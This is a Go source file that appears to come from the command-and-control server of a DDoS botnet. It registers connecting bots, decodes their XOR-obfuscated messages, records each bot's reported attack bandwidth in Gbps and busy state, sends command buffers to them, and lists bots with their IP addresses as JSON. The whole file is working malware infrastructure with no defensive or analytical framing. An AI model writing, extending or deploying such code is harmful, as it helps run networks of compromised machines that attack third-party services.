package main

import (
	"encoding/binary"
	"io"
	"net"
	"time"
)

type Bot struct {
	uid       int
	conn      net.Conn
	version   byte
	source    string
	crypto    *Crypto
	busy      bool
	speedGbps float64
}

func (b *Bot) IsBusy() bool {
	return b.busy
}

func (b *Bot) SetBusy(v bool) {
	b.busy = v
}

func (b *Bot) SetSpeed(gbps float64) {
	b.speedGbps = gbps
}

func (b *Bot) GetSpeed() float64 {
	return b.speedGbps
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
	return &Bot{-1, conn, version, source, nil, false, 0}
}

func (b *Bot) Handle() {
	clientList.AddClient(b)
	defer clientList.DelClient(b)

	for {
		lb := make([]byte, 2)
		b.conn.SetDeadline(time.Now().Add(180 * time.Second))
		if n, err := io.ReadFull(b.conn, lb); err != nil || n != 2 {
			return
		}
		if b.crypto != nil {
			b.crypto.XOR(lb)
		}
		l := binary.BigEndian.Uint16(lb)
		if l == 0 {
			continue
		}
		if l > 4096 {
			return
		}
		buf := make([]byte, l)
		if n, err := io.ReadFull(b.conn, buf); err != nil || int(n) != int(l) {
			return
		}
		if b.crypto != nil {
			b.crypto.XOR(buf)
		}

		if len(buf) >= 1 && buf[0] == 0x15 && len(buf) >= 5 {
			bytesSent := binary.BigEndian.Uint32(buf[1:5])
			gbps := float64(bytesSent*8) / 2.0 / 1_000_000_000.0
			b.SetSpeed(gbps)
			continue
		}
	}
}

func (b *Bot) QueueBuf(buf []byte) {
	if b.crypto != nil {
		cp := make([]byte, len(buf))
		copy(cp, buf)
		b.crypto.XOR(cp)
		b.conn.Write(cp)
	} else {
		b.conn.Write(buf)
	}
}

type BotEntry struct {
	ID      int    `json:"id"`
	IP      string `json:"ip"`
	Source  string `json:"source"`
	Version int    `json:"version"`
	Busy    bool   `json:"busy"`
	Speed   float64 `json:"speed_gbps"`
}

func (b *Bot) ToEntry() BotEntry {
	ip, _, _ := net.SplitHostPort(b.conn.RemoteAddr().String())
	return BotEntry{
		ID:      b.uid,
		IP:      ip,
		Source:  b.source,
		Version: int(b.version),
		Busy:    b.busy,
		Speed:   b.speedGbps,
	}
}
